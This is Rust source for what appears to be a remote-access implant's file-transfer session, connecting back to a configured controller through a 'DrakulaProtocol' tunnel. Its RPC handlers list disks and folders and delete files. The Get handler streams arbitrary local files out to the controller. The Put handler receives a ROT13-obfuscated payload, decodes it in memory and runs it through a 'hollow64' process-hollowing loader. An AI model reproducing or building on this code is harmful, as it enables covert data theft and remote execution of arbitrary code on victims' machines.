use BByte_util::{
    ftp::{method::*, FTPGetHeader, FTPId, FTPPacket, FTPPutHeader},
    packet::TunnelRequest,
    protocol::create_tunnel,
    rpc::{RpcMessage, RpcServer},
    session::{Session, SessionBase, SessionPacket},
    DrakulaProtocol,
};
use std::{
    io::{Read, Seek, SeekFrom, Write},
    sync::{atomic::AtomicBool, mpsc::Sender, Arc},
};
use crate::{G_DNA, msgbox};
use crate::config::master_configure;

use super::{loder_poc::*,  };
use std::thread;
use std::panic::{self, AssertUnwindSafe};
// use std::panic;
#[cfg(debug_assertions)]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
}

fn rot13_in_place(buf: &mut [u8]) {
    for byte in buf.iter_mut() {
        match *byte {
            b'a'..=b'm' | b'A'..=b'M' => *byte += 13, 
            b'n'..=b'z' | b'N'..=b'Z' => *byte -= 13,  
            _ => {}  
        }
    }
}
fn call_loader(mut buf: Vec<u8>,fileName:String){
    #[cfg(debug_assertions)]
    {
        
        // morf function
        let mut key_buf = "13374567890ZEF\0".as_bytes().to_vec();
        let sleep_time = 2200;
        
    }
    // msgbox::info(&"func running call_hollow_loader".to_string(), &"func call_holl".to_string());
    match hollow64(&mut buf) {
        Ok(_) => println!("Успешно: {:?}", buf),
        Err(e) => println!("Ошибка: {}", e),
    }

    
}
pub struct LoaderClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    rpc_server: RpcServer,
    sender: Sender<SessionBase>,
}

impl Session for LoaderClient {
    fn new_client(
        sender: std::sync::mpsc::Sender<BByte_util::session::SessionBase>,
        clientid: &String,
        id: &String,
    ) -> std::io::Result<Self>
    where
        Self: Sized,
    {
        let mut rpc_server = RpcServer::new();
        rpc_server.register(&"get_disk_info".to_string(), get_disk_info);
        rpc_server.register(&"get_folder_info".to_string(), get_folder_info);
        rpc_server.register(&"join_path".to_string(), join_path);
        rpc_server.register(&"remove_file".to_string(), remove_file);
        rpc_server.register(&"file_size".to_string(), file_size);
        rpc_server.register(&"md5_file".to_string(), md5_file);
        Ok(Self {
            id: id.clone(),
            clientid: clientid.clone(),
            closed: Arc::new(AtomicBool::new(false)),
            rpc_server,
            sender,
        })
    }

    fn new(
        _: std::sync::mpsc::Sender<BByte_util::session::SessionBase>,
        _: &String,
        _: &String,
    ) -> std::io::Result<Self>
    where
        Self: Sized,
    {
        Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "not server",
        ))
    }

    fn id(&self) -> String {
        self.id.clone()
    }

    fn write(&mut self, data: &Vec<u8>) -> std::io::Result<()> {
        let packet = FTPPacket::parse(data)?;

        match packet.id() {
            FTPId::RPC => {
                log::debug!("recv rpc call");
                let msg = RpcMessage::parse(&packet.data)?;
                let ret = self.rpc_server.call(&msg);

                let packet = FTPPacket {
                    id: FTPId::RPC.to_u8(),
                    data: ret.serialize()?,
                };

                let packet = SessionPacket {
                    id: self.id.clone(),
                    data: packet.serialize()?,
                };
                log::debug!("call ret : {:?}", ret);
                if let Err(e) = self.sender.send(SessionBase {
                    id: self.id.clone(),
                    clientid: self.clientid.clone(),
                    packet,
                }) {
                    log::error!("session sender error : {}", e);
                    self.closed
                        .store(true, std::sync::atomic::Ordering::Relaxed);
                };
            }
            FTPId::Get => {
                let packet = TunnelRequest::parse(&packet.data)?;

                let closed = self.closed.clone();

                std::thread::spawn(move || {
                    let config = master_configure();

                    let mut client = match create_tunnel(
                        &config.address,
                        &DrakulaProtocol::from(config.protocol),
                        packet.port,
                    ) {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("create tunnel faild : {}", e);
                            return;
                        }
                    };
                    log::debug!("create tunnel success");
                    let header = match client.recv() {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("recv get header tunnel faild : {}", e);
                            return;
                        }
                    };

                    let header = FTPGetHeader::parse(&header).unwrap();

                    let mut f = match std::fs::File::open(&header.path) {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("open file faild : {}", e);
                            return;
                        }
                    };

                    if header.start_pos != 0 {
                        match f.seek(SeekFrom::Start(header.start_pos)) {
                            Ok(p) => p,
                            Err(e) => {
                                log::error!("seek file faild : {}", e);
                                return;
                            }
                        };
                    }

                    log::debug!("start get transfer [{}]", header.path);
                    loop {
                        if closed.load(std::sync::atomic::Ordering::Relaxed) {
                            log::error!("session closed");
                            break;
                        }

                        let mut buf = [0u8; 1024 * 20];
                        let size = match f.read(&mut buf) {
                            Ok(p) => p,
                            Err(e) => {
                                log::error!("read file faild : {}", e);
                                break;
                            }
                        };

                        if size == 0 {
                            break;
                        }

                        log::debug!("send file data [{}]", size);
                        match client.send(&mut buf[..size]) {
                            Ok(_) => {}
                            Err(e) => {
                                log::error!("get worker send to server faild : {}", e);
                                break;
                            }
                        };
                    }

                    log::info!("get file worker finished");
                });
            }
            FTPId::Put => {
                let packet = TunnelRequest::parse(&packet.data)?;
                let closed = self.closed.clone();

                std::thread::spawn(move || {
                    let config = master_configure();

                    let mut client = match create_tunnel(
                        &config.address,
                        &DrakulaProtocol::from(config.protocol),
                        packet.port,
                    ) {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("create tunnel faild : {}", e);
                            return;
                        }
                    };
                    log::debug!("create tunnel success");

                    let header = match client.recv() {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("recv get header faild : {}", e);
                            return;
                        }
                    };

                    let header = match FTPPutHeader::parse(&header) {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("parse get header faild : {}", e);
                            return;
                        }
                    };

                    // let mut f = if header.start_pos == 0 {
                    //     match std::fs::File::create(&header.path) {
                    //         Ok(p) => p,
                    //         Err(e) => {
                    //             log::error!("create remote file faild [{}] : {}", header.path, e);
                    //             return;
                    //         }
                    //     }
                    // } else {
                    //     // let mut f = match std::fs::File::options().write(true).open(&header.path) {
                    //     //     Ok(p) => {
                    //     //         // Выполняем код перед возвратом значения
                    //     //         msgbox::info(&"file".to_string(), &"write 01010".to_string());
                    //     //         p // Возвращаем значение после выполнения кода
                    //     //     },
                    //     //     Err(e) => {
                    //     //         msgbox::info(&"open remote file faild [{}] : {}".to_string(), &header.path.to_string());
                    //     //         log::error!("open remote file faild [{}] : {}", header.path, e);
                    //     //         return;
                    //     //     }
                    //     // };

                    //     match f.seek(SeekFrom::Start(header.start_pos)) {
                    //         Ok(p) => p,
                    //         Err(e) => {
                    //             log::error!("seek remote file faild [{}] : {}", header.path, e);
                    //             return;
                    //         }
                    //     };
                    //     f
                    // };
                    // SeekFrom::Start(header.start_pos)
                    let mut buf: Vec<u8> = Vec::new(); // Создаем вектор для хранения данных

                    log::debug!("start put transfer [{}]", header.path);
                    loop {
                        if closed.load(std::sync::atomic::Ordering::Relaxed) {
                            log::error!("session closed");
                            break;
                        }
                
                        let data = match client.recv() {
                            Ok(p) => p,
                            Err(e) => {
                                log::error!("recv data failed from ftp slave : {}", e);
                                break;
                            }
                        };
                
                        // Если данные пустые, завершаем цикл
                        if data.is_empty() {
                            break;
                        }
                
                        // Записываем данные в вектор
                        buf.extend_from_slice(&data);
                
                        log::debug!("recv transfer data [{}]", data.len());
                        log::error!("555 recv transfer data [{}]", data.len());
                
                        // Проверяем, достигнут ли общий размер файла
                        if buf.len() as u64 >= header.total_size {
                            rot13_in_place(&mut buf);

                            let strbuf = {
                                let borrowed_buf = &buf; // Заимствуем buf
                                String::from_utf8_lossy(borrowed_buf) // Создаем строку из заимствованного буфера
                            };
                            let message = format!("file download complete [{} bytes]", &strbuf.to_string().len());
                            msgbox::info(&"Path:".to_string(), &header.path.to_string());
                            log::info!("file download complete [{} bytes]", &strbuf.to_string().len());
                        
                            // Клонируем данные, которые будут переданы в поток

                            
                            let buf_clone = buf.clone();
                            let path_clone = header.path.to_string();
                        
                            // Создаем новый поток
                            thread::spawn(move || {

                                let result = panic::catch_unwind(|| {
                                    
                                 call_loader(buf_clone, path_clone);
                                     
                                });
                                match result {
                                    Ok(_) => {
                                        println!("call_loader executed successfully");
                                    }
                                    Err(e) => {
                                        // Handle the panic error, e is a Box<dyn Any>
                                        println!("Error occurred in call_loader: {:?}", e);
                                    }
                                }
                            });
                        
                            break;
                        }
                    }
                });
            }
            FTPId::Close => {
                self.close();
            }
            FTPId::Unknown => {}
        }

        Ok(())
    }

    fn alive(&self) -> bool {
        !self.closed.load(std::sync::atomic::Ordering::Relaxed)
    }

    fn close(&mut self) {
        log::info!("ftp session closed");
        self.closed
            .store(true, std::sync::atomic::Ordering::Relaxed);
    }

    fn clientid(&self) -> String {
        self.clientid.clone()
    }
    
   
}
